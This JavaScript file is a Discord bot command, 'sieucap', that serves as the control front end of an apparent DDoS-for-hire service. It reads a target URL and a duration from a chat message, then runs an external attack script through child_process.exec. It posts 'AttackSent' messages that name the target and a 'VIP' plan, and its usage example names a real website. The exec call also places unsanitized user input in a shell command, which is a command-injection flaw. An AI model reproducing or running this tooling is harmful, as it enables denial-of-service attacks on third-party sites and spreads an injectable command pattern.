const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;sieucap https://pornhub.com 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node sieucap.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('FLORIA AttackSent')
	.setTimestamp()
	.setColor('RANDOM')
	.setTitle('FLORIA AttackSent')
	.setTimestamp()
  .setDescription("Plan : VIP  \nTarget : `" + host + " \nMethods : SieuCap  \nTime : " + duration + "")
	.setFooter('© Developer: nguyenducphu', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://i.pinimg.com/originals/e0/6d/64/e06d64c693574b629e5e6139d070f7de.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://i.pinimg.com/originals/a4/8e/6c/a48e6cb70a3822090500d42bc718c764.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('FLORIA ATTACK')
	.setTimestamp()
	.setDescription("𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧")
	.setFooter('© Developer: nguyenducphu', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['sieucap'],
  permLevel: 0
}

exports.help = {
  name: 'sieucap',
  description: 'FLORIA',
  usage: 'sieucap'
}
